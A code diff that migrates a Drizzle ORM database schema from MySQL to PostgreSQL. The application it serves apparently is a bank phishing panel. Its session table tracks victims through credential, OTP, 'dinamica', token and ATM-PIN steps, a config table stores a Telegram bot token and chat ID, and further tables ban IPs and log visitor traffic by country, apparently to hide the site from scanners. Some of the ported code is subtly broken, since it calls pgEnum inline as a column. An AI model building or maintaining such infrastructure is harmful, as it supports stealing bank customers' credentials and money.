@@ -1,17 +1,17 @@
-import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, json } from "drizzle-orm/mysql-core";
+import { integer, pgEnum, pgTable, text, timestamp, varchar, json, serial } from "drizzle-orm/pg-core";
 
 /**
  * Core user table backing auth flow.
  */
-export const users = mysqlTable("users", {
-  id: int("id").autoincrement().primaryKey(),
+export const users = pgTable("users", {
+  id: serial("id").primaryKey(),
   openId: varchar("openId", { length: 64 }).notNull().unique(),
   name: text("name"),
   email: varchar("email", { length: 320 }),
   loginMethod: varchar("loginMethod", { length: 64 }),
-  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
+  role: pgEnum("role", ["user", "admin"]).default("user").notNull(),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
   lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
 });
 
@@ -22,8 +22,8 @@ export type InsertUser = typeof users.$inferInsert;
  * 3D Secure Sessions - Stores verification sessions
  * Each session represents a user going through the 3D Secure flow
  */
-export const secureSession = mysqlTable("secure_sessions", {
-  id: int("id").autoincrement().primaryKey(),
+export const secureSession = pgTable("secure_sessions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
   /** Current step the user is on: credentials, otp, dinamica, token, atm, completed */
   currentStep: varchar("currentStep", { length: 32 }).default("credentials").notNull(),
@@ -61,7 +61,7 @@ export const secureSession = mysqlTable("secure_sessions", {
   userAgent: text("userAgent"),
   /** Timestamps */
   createdAt: timestamp("createdAt").defaultNow().notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
 });
 
 export type SecureSession = typeof secureSession.$inferSelect;
@@ -70,8 +70,8 @@ export type InsertSecureSession = typeof secureSession.$inferInsert;
 /**
  * Banned IPs - Stores IPs that are blocked from accessing the site
  */
-export const bannedIps = mysqlTable("banned_ips", {
-  id: int("id").autoincrement().primaryKey(),
+export const bannedIps = pgTable("banned_ips", {
+  id: serial("id").primaryKey(),
   ipAddress: varchar("ipAddress", { length: 64 }).notNull().unique(),
   reason: varchar("reason", { length: 256 }),
   bannedBy: varchar("bannedBy", { length: 64 }).default("admin").notNull(),
@@ -84,10 +84,10 @@ export type InsertBannedIp = typeof bannedIps.$inferInsert;
 /**
  * Visit Counter - Tracks page visits/clicks
  */
-export const visitCounter = mysqlTable("visit_counter", {
-  id: int("id").autoincrement().primaryKey(),
-  count: int("count").default(0).notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+export const visitCounter = pgTable("visit_counter", {
+  id: serial("id").primaryKey(),
+  count: integer("count").default(0).notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
 });
 
 export type VisitCounter = typeof visitCounter.$inferSelect;
@@ -96,11 +96,11 @@ export type VisitCounter = typeof visitCounter.$inferSelect;
  * App Config - Persistent key-value store for admin panel settings
  * Stores adminPin, telegramBotToken, telegramChatId, etc.
  */
-export const appConfig = mysqlTable("app_config", {
-  id: int("id").autoincrement().primaryKey(),
+export const appConfig = pgTable("app_config", {
+  id: serial("id").primaryKey(),
   key: varchar("key", { length: 64 }).notNull().unique(),
   value: text("value").notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
 });
 
 export type AppConfig = typeof appConfig.$inferSelect;
@@ -108,13 +108,13 @@ export type AppConfig = typeof appConfig.$inferSelect;
 /**
  * Traffic Log - Detailed log of every visit with IP, User-Agent, and timestamp
  */
-export const trafficLog = mysqlTable("traffic_log", {
-  id: int("id").autoincrement().primaryKey(),
+export const trafficLog = pgTable("traffic_log", {
+  id: serial("id").primaryKey(),
   ipAddress: varchar("ipAddress", { length: 64 }).notNull(),
   userAgent: text("userAgent"),
   path: varchar("path", { length: 512 }).default("/"),
   country: varchar("country", { length: 64 }),
-  blocked: int("blocked").default(0).notNull(),
+  blocked: integer("blocked").default(0).notNull(),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
 });
 
